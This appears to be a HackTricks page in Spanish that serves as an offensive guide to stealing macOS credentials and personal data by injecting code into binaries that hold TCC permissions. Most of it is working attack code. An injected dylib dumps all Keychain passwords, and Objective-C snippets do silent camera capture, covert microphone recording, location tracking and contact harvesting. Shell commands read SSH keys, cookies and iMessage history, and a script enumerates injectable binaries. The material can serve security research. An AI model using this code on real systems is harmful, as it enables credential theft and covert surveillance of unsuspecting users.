# Robo de credenciales y datos de macOS mediante permisos TCC

{{#include ../../../../banners/hacktricks-training.md}}

## Descripción general

macOS TCC (Transparency, Consent, and Control) protege el acceso a datos confidenciales del usuario. Cuando un atacante **compromete un binario que ya tiene permisos TCC**, hereda esos permisos. Esta página documenta el potencial de explotación de cada permiso TCC relacionado con el robo de datos.

> [!WARNING]
> La inyección de código en un binario con permisos TCC (mediante inyección DYLD, secuestro de dylib o task port) **hereda silenciosamente todos sus permisos TCC**. No aparece ningún aviso ni verificación adicional cuando el mismo proceso lee datos protegidos.

---

## Grupos de acceso de Keychain

### El premio

El Keychain de macOS almacena:
- **Contraseñas de Wi-Fi** — todas las credenciales de redes inalámbricas guardadas
- **Contraseñas de sitios web** — Safari, Chrome (cuando usa Keychain) y las contraseñas de otros navegadores
- **Contraseñas de aplicaciones** — cuentas de correo electrónico, credenciales de VPN y tokens de desarrollo
- **Certificados y claves privadas** — firma de código, TLS de cliente y cifrado S/MIME
- **Notas seguras** — secretos almacenados por el usuario

### Entitlement: `keychain-access-groups`

Los elementos de Keychain están organizados en **grupos de acceso**. El entitlement `keychain-access-groups` de una aplicación enumera los grupos a los que puede acceder:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Explotación
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Robo de Keychain
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Acceso a la cámara (kTCCServiceCamera)

### Explotación

Un binario con un permiso de TCC para la cámara (mediante `kTCCServiceCamera` o el entitlement `com.apple.security.device.camera`) puede capturar fotos y vídeo:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Captura silenciosa
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> A partir de **macOS Sonoma**, el indicador de la cámara en la barra de menús es persistente y no se puede ocultar mediante programación. En **versiones anteriores de macOS**, una captura breve puede no mostrar un indicador perceptible.

---

## Acceso al micrófono (kTCCServiceMicrophone)

### Exploitation

El acceso al micrófono captura todo el audio del micrófono integrado, los auriculares o los dispositivos de entrada de audio conectados:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Ataque: Grabación ambiental
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Seguimiento de ubicación (kTCCServiceLocation)

### Explotación
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Seguimiento continuo
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Contactos / Calendario / Fotos

### Exfiltración de datos personales

| Servicio TCC | Framework | Datos |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Nombres, correos electrónicos, teléfonos, direcciones |
| `kTCCServiceCalendar` | `EventKit` | Reuniones, asistentes, ubicaciones |
| `kTCCServicePhotos` | `Photos.framework` | Fotos, capturas de pantalla, metadatos de ubicación |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Recopilación de contactos
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Acceso a la cuenta de iCloud

### Entitlement: `com.apple.private.icloud-account-access`

Este entitlement permite comunicarse con el servicio XPC `com.apple.iCloudHelper`, proporcionando acceso a:
- **Tokens de iCloud** — tokens de autenticación del Apple ID del usuario
- **iCloud Drive** — documentos sincronizados de todos los dispositivos
- **iCloud Keychain** — contraseñas sincronizadas en todos los dispositivos Apple
- **Find My** — ubicación de todos los dispositivos Apple del usuario<sup>[4]</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Comprometer un binario con entitlement de iCloud extiende el ataque de un **dispositivo individual a todo el ecosistema de Apple**: otros Macs, iPhones, iPads y Apple Watch. La sincronización de iCloud Keychain significa que las contraseñas de todos los dispositivos son accesibles.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### El permiso TCC más potente

Full Disk Access concede capacidad de lectura sobre **todos los archivos del sistema**, incluidos:
- Datos de otras aplicaciones (Messages, Mail, historial de Safari)
- Bases de datos de TCC (que revelan todos los demás permisos)
- Claves y configuración de SSH
- Cookies y tokens de sesión del navegador
- Bases de datos y cachés de las aplicaciones
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Matriz de prioridad de explotación

Al evaluar binarios con permisos TCC inyectables, prioriza según el valor de los datos:

| Prioridad | Permiso TCC | Motivo |
|---|---|---|
| **Crítica** | Full Disk Access | Acceso a todo |
| **Crítica** | TCC Manager | Puede conceder cualquier permiso |
| **Alta** | Keychain Access Groups | Todas las contraseñas almacenadas |
| **Alta** | iCloud Account Access | Compromiso de varios dispositivos |
| **Alta** | Input Monitoring (ListenEvent) | Keylogging |
| **Alta** | Accessibility | Control de la GUI, autoasignación de permisos |
| **Media** | Screen Capture | Captura de datos visuales |
| **Media** | Camera + Microphone | Vigilancia |
| **Media** | Contacts + Calendar | Datos para ingeniería social |
| **Baja** | Location | Seguimiento físico |
| **Baja** | Photos | Datos personales |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Referencias

- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
- [4] [OBTS v5.0 — "What Happens on your Mac, Stays on Apple's iCloud?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../../banners/hacktricks-training.md}}
